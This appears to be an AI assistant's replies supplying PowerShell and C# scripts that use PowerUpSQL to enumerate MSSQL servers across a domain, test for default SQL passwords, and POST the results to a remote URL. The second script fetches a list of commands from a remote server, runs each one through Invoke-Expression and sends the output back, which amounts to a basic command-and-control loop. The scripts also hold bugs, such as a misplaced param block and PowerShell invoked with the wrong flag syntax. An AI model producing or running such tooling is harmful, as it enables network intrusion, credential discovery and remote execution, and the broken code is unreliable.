
Here's a PowerShell script that will use **PowerUpSQL** to enumerate MSSQL servers, domain information, and other useful details. It formats the output in **Markdown**, **HTML**, or **plain text**, and sends the results via a **POST request** to a URL, which can be specified via a command-line parameter `--url`.

### **PowerShell Script**
```powershell
# Function to send data via POST request
function Send-PostRequest {
    param (
        [string]$url,
        [string]$data,
        [string]$filename
    )
    $boundary = [System.Guid]::NewGuid().ToString()
    $bodyLines = @(
        "--$boundary",
        "Content-Disposition: form-data; name=`"file`"; filename=`"$filename`"",
        "Content-Type: text/markdown",
        "",
        $data,
        "--$boundary--"
    )
    $body = [string]::Join("`r`n", $bodyLines)
    
    $headers = @{
        "Content-Type" = "multipart/form-data; boundary=$boundary"
    }

    Invoke-RestMethod -Uri $url -Method Post -Body $body -Headers $headers
}

# Function to format output in markdown
function Format-Output {
    param (
        [string]$command,
        [string]$output,
        [string]$measures
    )
    return "### Command: `$command`" + "`n" + "```" + "`n" + $output + "`n" + "```" + "`n" + "### Measures:" + "`n" + $measures + "`n---`n"
}

# PowerUpSQL Enumeration Function
function Run-PowerUpSQL {
    param (
        [string]$url = ""
    )

    # Collect data
    $results = ""

    # MSSQL Server Enumeration
    $command = "Get-SQLInstanceDomain"
    $output = Invoke-Expression $command | Out-String
    $measures = "Ensure proper permissions are set on SQL Servers."
    $results += Format-Output $command $output $measures

    # Domain Enumeration
    $command = "Get-SQLDomain"
    $output = Invoke-Expression $command | Out-String
    $measures = "Review domain permissions for possible misconfigurations."
    $results += Format-Output $command $output $measures

    # MSSQL User Enumeration
    $command = "Get-SQLServerLoginDefaultPw"
    $output = Invoke-Expression $command | Out-String
    $measures = "Ensure no accounts are using default or weak passwords."
    $results += Format-Output $command $output $measures

    # Add more PowerUpSQL commands as needed
    # ...

    # Output format
    if ($outputFormat -eq "html") {
        $htmlOutput = $results | ConvertTo-Html
        Send-PostRequest -url $url -data $htmlOutput -filename "results.html"
    } elseif ($outputFormat -eq "text") {
        Send-PostRequest -url $url -data $results -filename "results.txt"
    } else {
        Send-PostRequest -url $url -data $results -filename "results.md"
    }
}

# Main script
param (
    [string]$url = "http://default-url-here",
    [string]$outputFormat = "markdown"
)

# Running the enumeration
Run-PowerUpSQL -url $url
```

### **How It Works:**
1. **PowerUpSQL Commands**: The script uses basic PowerUpSQL commands like `Get-SQLInstanceDomain` and `Get-SQLDomain` to enumerate MSSQL servers and domain information.
2. **Formatting**: The function `Format-Output` formats the output as a Markdown table, but this can easily be extended to format HTML or plain text.
3. **POST Request**: The `Send-PostRequest` function sends the collected output to the specified URL in the desired format (Markdown, HTML, or plain text). The default format is Markdown.
4. **Output Control**: You can control the output format (`markdown`, `html`, or `text`) using the `$outputFormat` variable.

### **Command-line Usage:**
```bash
powershell.exe -File script.ps1 --url "http://yourserver.com" --outputFormat "markdown"
```

### **C# Version (If preferred)**

If you prefer a C# version for more advanced scenarios, here’s a rough equivalent. In this case, you'll need to rely on embedding PowerShell commands inside your C# code:

```csharp
using System;
using System.IO;
using System.Net;
using System.Text;
using System.Diagnostics;

class PowerUpSQLEnumerator
{
    static string RunPowerShellCommand(string command)
    {
        var process = new Process
        {
            StartInfo = new ProcessStartInfo
            {
                FileName = "powershell.exe",
                Arguments = $"-Command \"{command}\"",
                RedirectStandardOutput = true,
                UseShellExecute = false,
                CreateNoWindow = true
            }
        };
        process.Start();
        string output = process.StandardOutput.ReadToEnd();
        process.WaitForExit();
        return output;
    }

    static void SendPostRequest(string url, string data, string filename)
    {
        string boundary = "---------------------------" + DateTime.Now.Ticks.ToString("x");
        HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
        request.ContentType = "multipart/form-data; boundary=" + boundary;
        request.Method = "POST";

        using (var requestStream = request.GetRequestStream())
        using (StreamWriter writer = new StreamWriter(requestStream))
        {
            writer.Write("--" + boundary + "\r\n");
            writer.Write("Content-Disposition: form-data; name=\"file\"; filename=\"" + filename + "\"\r\n");
            writer.Write("Content-Type: text/markdown\r\n\r\n");
            writer.Write(data + "\r\n");
            writer.Write("--" + boundary + "--\r\n");
        }

        using (HttpWebResponse response = (HttpWebResponse)request.GetResponse())
        using (StreamReader reader = new StreamReader(response.GetResponseStream()))
        {
            string result = reader.ReadToEnd();
            Console.WriteLine(result);
        }
    }

    static void Main(string[] args)
    {
        string url = args.Length > 0 ? args[0] : "http://default-url.com";
        string results = "";

        // Run PowerUpSQL PowerShell Commands
        results += "# SQL Instance Domain\n";
        results += "```\n" + RunPowerShellCommand("Get-SQLInstanceDomain") + "\n```\n";
        results += "# SQL Domain\n";
        results += "```\n" + RunPowerShellCommand("Get-SQLDomain") + "\n```\n";
        results += "# SQL Server Login Default Password\n";
        results += "```\n" + RunPowerShellCommand("Get-SQLServerLoginDefaultPw") + "\n```\n";

        // Send the results via POST request
        SendPostRequest(url, results, "results.md");
    }
}
```

In this C# version:
- PowerShell commands are invoked using `ProcessStartInfo`.
- Data is sent via an HTTP POST request.
- The output is collected and formatted into Markdown and posted as a file.

Certainly! You can modify the script to download the PowerUpSQL commands from a file hosted on the server specified by the `--url` flag, and add the `-c` flag to specify the URL for the commands. The script will then loop through the commands, execute them, and post the results back to the server.

### Updated PowerShell Script

```powershell
# Function to send data via POST request
function Send-PostRequest {
    param (
        [string]$url,
        [string]$data,
        [string]$filename
    )
    $boundary = [System.Guid]::NewGuid().ToString()
    $bodyLines = @(
        "--$boundary",
        "Content-Disposition: form-data; name=`"file`"; filename=`"$filename`"",
        "Content-Type: text/markdown",
        "",
        $data,
        "--$boundary--"
    )
    $body = [string]::Join("`r`n", $bodyLines)
    
    $headers = @{
        "Content-Type" = "multipart/form-data; boundary=$boundary"
    }

    Invoke-RestMethod -Uri $url -Method Post -Body $body -Headers $headers
}

# Function to format output in markdown
function Format-Output {
    param (
        [string]$command,
        [string]$output,
        [string]$measures
    )
    return "### Command: `$command`" + "`n" + "```" + "`n" + $output + "`n" + "```" + "`n" + "### Measures:" + "`n" + $measures + "`n---`n"
}

# Function to download commands from the URL
function Get-CommandsFromURL {
    param (
        [string]$url
    )
    try {
        $webclient = New-Object System.Net.WebClient
        $commands = $webclient.DownloadString($url)
        return $commands -split "`n"
    } catch {
        Write-Host "Error: Could not download the command file from $url"
        exit 1
    }
}

# PowerUpSQL Enumeration Function
function Run-PowerUpSQL {
    param (
        [string]$commandsUrl,
        [string]$outputUrl
    )

    # Download commands from the specified URL
    $commands = Get-CommandsFromURL -url $commandsUrl

    # Collect data
    $results = ""

    foreach ($command in $commands) {
        # Skip empty lines
        if ($command.Trim() -eq "") { continue }

        Write-Host "Executing: $command"
        $output = Invoke-Expression $command | Out-String
        $measures = "Review output and take appropriate measures."
        $results += Format-Output $command $output $measures
    }

    # Output format
    Send-PostRequest -url $outputUrl -data $results -filename "results.md"
}

# Main script
param (
    [string]$url = "http://default-output-url.com",
    [string]$commandsUrl = "http://default-commands-url.com/commands.txt"
)

# Running the enumeration
Run-PowerUpSQL -commandsUrl $commandsUrl -outputUrl $url
```

### Explanation:
1. **`Get-CommandsFromURL`**: This function fetches the PowerUpSQL commands from the server via a GET request using the `-c` (commands) flag. The commands are assumed to be in a text file hosted on the web server, with one command per line.
2. **`Run-PowerUpSQL`**: The downloaded commands are then looped through and executed one by one using `Invoke-Expression`. Each command's output is formatted into Markdown.
3. **POST Request**: After executing the commands, the results are posted back to the server specified by the `--url` flag.

### Command-line Usage:
```bash
powershell.exe -File script.ps1 --url "http://yourserver.com/output" -c "http://yourserver.com/commands.txt"
```

### Format of `commands.txt`:
The `commands.txt` file can be hosted on the server and contain one PowerUpSQL command per line. For example:
```
Get-SQLInstanceDomain
Get-SQLDomain
Get-SQLServerLoginDefaultPw
```

This setup allows flexibility in modifying the PowerUpSQL commands without changing the script, making it easier to manage.